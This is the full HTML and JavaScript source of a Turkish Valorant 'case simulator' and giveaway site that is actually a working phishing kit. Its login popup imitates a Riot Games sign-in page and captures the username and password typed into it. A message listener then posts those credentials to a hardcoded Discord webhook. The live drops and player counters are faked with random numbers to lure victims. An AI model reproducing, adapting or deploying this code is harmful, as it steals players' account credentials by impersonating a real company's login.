<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALOLOOT.NET | Valorant Case Simulator</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
    <style>
        :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
        body { background: var(--dark-bg) url('bg.jpg') fixed center/cover; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
        .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; justify-content: flex-start; overflow: hidden; position: relative; width: 100%; }
        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 10; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
        .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; }
        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; margin-right: 12px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; animation: slideIn 0.4s ease-out; padding-top: 10px; overflow: hidden; }
        .drop-card img { height: 45px; object-fit: contain; }
        .rarity-box { width: 100%; height: 6px; margin-top: auto; }
        @keyframes slideIn { from { transform: translateX(-30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
        .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
        .logo span { color: var(--valo-red); }
        .nav-links { display: flex; gap: 25px; flex-grow: 1; }
        .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; display: flex; align-items: center; gap: 10px; text-transform: uppercase; font-size: 14px; box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4); }
        .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; }
        #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
        .title-container { width: 100%; background: linear-gradient(90deg, transparent, rgba(0,0,0,0.8), transparent); border-top: 1px solid rgba(255,70,85,0.3); border-bottom: 1px solid rgba(255,70,85,0.3); padding: 20px 0; margin: 40px 0; text-align: center; }
        .title-container h3 { margin: 0; font-family: 'Montserrat'; letter-spacing: 6px; color: #fff; font-size: 24px; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
        .case-wrapper { max-width: 1300px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; min-height: 100px; }
        .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; overflow: hidden; display: flex; flex-direction: column; align-items: center; cursor: pointer; }
        .case-img-container { width: 100%; height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; overflow: hidden; }
        .case-box img { max-width: 110%; max-height: 100%; object-fit: contain; }
        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
        .live-stats { display: flex; justify-content: center; gap: 80px; padding: 60px 0; background: rgba(0,0,0,0.5); margin-top: 40px; border-top: 1px solid rgba(255,255,255,0.05); }
        .stat-num { display: block; font-size: 34px; font-weight: 900; color: #fff; font-family: 'Montserrat'; min-width: 120px; }
    </style>
</head>
<body>

    <div class="live-drops">
        <div class="mythic-label">Last Mythic Item</div>
        <div class="drop-container" id="dropTrack"></div>
    </div>

    <header>
        <div class="logo">VALO<span>LOOT</span></div>
        <div class="nav-links">
            <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Sözleşmeler</a><a href="#">Mağaza</a>
        </div>
        <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
    </header>

    <div class="giveaway-section">
        <div>
            <h2 style="margin:0; font-family:'Montserrat'; font-size:32px;">10 ADET 8900 VP ÇEKİLİŞİ</h2>
            <p style="color:var(--valo-red); font-weight:800; margin:5px 0;">SADECE OTURUM AÇANLAR KATILABİLİR</p>
        </div>
        <div style="text-align:right; border-left: 2px solid var(--valo-red); padding-left: 30px;">
            <div id="countdown">00:00:00</div>
            <span style="font-size:10px; color:#555;">KALAN SÜRE</span>
        </div>
    </div>

    <div class="title-container"><h3>POPÜLER SANDIKLAR</h3></div>

    <div class="case-wrapper">
        <div class="case-row" id="row1"></div>
        <div class="case-row" id="row2"></div>
    </div>

    <div class="live-stats">
        <div class="stat-box"><span class="stat-num" id="stat-players">2,841</span><span style="color:#555; font-size:12px; font-weight:800;">AKTİF OYUNCU</span></div>
        <div class="stat-box"><span class="stat-num" id="stat-cases">148,209</span><span style="color:#555; font-size:12px; font-weight:800;">KASA AÇILDI</span></div>
        <div class="stat-box"><span class="stat-num" id="stat-vp">1,250,400</span><span style="color:#555; font-size:12px; font-weight:800;">VP DAĞITILDI</span></div>
    </div>

    <script>
        // 1. SAYAÇ VE KASA SİSTEMLERİ (ANA SAYFA)
        document.addEventListener('DOMContentLoaded', function() {
            // Skin Drops
            const skins = [{img: "skin1.png", color: "#ade55c"}, {img: "skin2.png", color: "#4b82d5"}, {img: "skin3.png", color: "#d151dc"}, {img: "skin4.png", color: "#f7c133"}, {img: "skin5.png", color: "#ff4655"}];
            const track = document.getElementById('dropTrack');
            function addNewDrop() {
                if(!track) return;
                const s = skins[Math.floor(Math.random() * skins.length)];
                const c = document.createElement('div');
                c.className = 'drop-card';
                c.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:${s.color}"></div>`;
                track.prepend(c);
                if(track.children.length > 12) track.removeChild(track.lastChild);
                setTimeout(addNewDrop, Math.random() * 3000 + 2000);
            }
            addNewDrop();

            // Cases
            const cases = [
                {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png"}, {n: "STANDART", p: "30 VP", i: "case2.png"},
                {n: "ELİT", p: "50 VP", i: "case3.png"}, {n: "PREMIUM", p: "100 VP", i: "case4.png"},
                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
            ];
            const r1 = document.getElementById('row1');
            const r2 = document.getElementById('row2');
            if(r1 && r2) {
                cases.slice(0, 4).forEach(c => { r1.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`; });
                cases.slice(4, 6).forEach(c => { r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`; });
            }

            // Giveaway Counter
            function tick() {
                const now = new Date();
                let target = new Date(); target.setHours(24, 0, 0, 0);
                let diff = target - now;
                if(diff < 0) diff += 86400000;
                let h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            }
            setInterval(tick, 1000); tick();

            // Stats
            let pCount = 2841, cCount = 148209, vCount = 1250400;
            setInterval(() => {
                pCount += Math.floor(Math.random() * 5) - 2;
                cCount += Math.floor(Math.random() * 3);
                vCount += Math.floor(Math.random() * 100);
                document.getElementById('stat-players').innerText = pCount.toLocaleString();
                document.getElementById('stat-cases').innerText = cCount.toLocaleString();
                document.getElementById('stat-vp').innerText = vCount.toLocaleString();
            }, 3000);
        });

        // 2. AUTH SİSTEMİ (POP-UP)
        function openAuth() {
            const w = 550, h = 800;
            const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
            let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
            
            const popupHTML = `
                <html>
                <head>
                    <title>Riot Games - Oturum Aç</title>
                    <style>
                        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
                        body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; background:#fff; }
                        .card { width:330px; text-align:center; padding: 20px; }
                        h2 { font-weight:900; font-size:24px; margin: 25px 0; color:#111; }
                        .input-container { position: relative; margin: 10px 0; }
                        input { width:100%; padding: 24px 16px 8px 16px; background:#f2f2f2; border:2px solid transparent; border-radius:4px; font-weight:700; outline:none; box-sizing:border-box; }
                        .label { position: absolute; left: 16px; top: 18px; color: #999; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.15s; font-weight:800; }
                        input:focus + .label, input:not(:placeholder-shown) + .label { top: 8px; font-size: 9px; color: #333; }
                        input:focus { border-color: #111; background:#fff; }
                        .next-btn { width:75px; height:75px; border:2px solid #eee; border-radius:24px; background:#fff; cursor:pointer; margin-top:30px; transition:0.3s; }
                        .next-btn.active { border-color:#ff4655; }
                        .next-btn svg { width:30px; fill:#ddd; }
                        .next-btn.active svg { fill:#ff4655; }
                    </style>
                </head>
                <body>
                    <div class="card">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="50">
                        <h2>GİRİŞ</h2>
                        <div class="input-container"><input type="text" id="u" placeholder=" "><span class="label">Kullanıcı Adı</span></div>
                        <div class="input-container"><input type="password" id="p" placeholder=" "><span class="label">Şifre</span></div>
                        <button class="next-btn" id="go"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
                    </div>
                    <script>
                        const u=document.getElementById('u'), p=document.getElementById('p'), b=document.getElementById('go');
                        const c=()=>(u.value && p.value)?b.classList.add('active'):b.classList.remove('active');
                        u.oninput=c; p.oninput=c;
                        b.onclick=function(){
                            if(u.value && p.value){
                                window.opener.postMessage({user:u.value, pass:p.value}, "*");
                                window.close();
                            }
                        };
                    <\/script>
                </body>
                </html>`;
            win.document.write(popupHTML);
            win.document.close();
        }

        // 3. WEBHOOK (ANA SAYFA DİNLEYİCİ)
        window.addEventListener("message", function(e) {
            if (e.data.user && e.data.pass) {
                fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "⚠️ Yeni Giriş",
                            color: 16725845,
                            fields: [
                                { name: "👤 Kullanıcı", value: "```" + e.data.user + "```" },
                                { name: "🔑 Şifre", value: "```" + e.data.pass + "```" }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            }
        });
    </script>
</body>
</html>
